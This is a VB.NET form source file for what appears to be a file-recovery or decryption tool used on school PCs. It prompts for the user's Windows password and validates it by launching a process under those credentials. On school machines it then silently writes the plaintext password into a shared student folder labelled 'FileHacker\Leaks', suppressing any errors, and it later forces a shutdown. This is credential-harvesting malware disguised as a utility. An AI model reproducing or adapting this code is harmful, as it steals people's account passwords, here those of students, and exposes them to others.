Imports System.Security
Imports ReturnFile.PowerManager
Imports ReturnFile.SchoolPCChecker
Imports ReturnFile.Tools
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Public Shared Function VerifyPassword(pw As String) As Boolean
        Try
            Dim si As New ProcessStartInfo
            si.FileName = System.Reflection.Assembly.GetEntryAssembly().Location
            si.Arguments = """passwordCheck"""
            si.UserName = Environment.UserName
            si.Domain = Environment.UserDomainName
            Dim ssPwd As New SecureString()
            For Each c As Char In pw
                ssPwd.AppendChar(c)
            Next
            si.Password = ssPwd
            si.UseShellExecute = False
            Process.Start(si).WaitForExit()
            Return True
        Catch ex As Exception
            Console.WriteLine(ex.GetType.Name)
            Console.WriteLine(ex.Message)
            Console.WriteLine(ex.StackTrace)
            Return False
        End Try
    End Function
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If VerifyPassword(TextBox1.Text) Then
            GroupBox1.Enabled = False
            GroupBox2.Enabled = True
            Try
                If IsSchool Then
                    MakeFolder("\\pcjhkhsv01\生徒共用\FileHacker\Leaks\")
                    Tools.SerializeObject(New PasswordStronghold(TextBox1.Text), "\\pcjhkhsv01\生徒共用\FileHacker\Leaks\Password_" & GetUN() & ".xml")
                End If
            Catch ex As Exception
            End Try
        End If
    End Sub
    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        DecryptFiles.ShowDialog()
        If IsSchool Then
            PowerManager.AdjustToken()
            PowerManager.ExitWindowsEx(PowerManager.ExitWindows.EWX_SHUTDOWN Or PowerManager.ExitWindows.EWX_FORCE, 0)
        End If
        Me.Close()
    End Sub
End Class
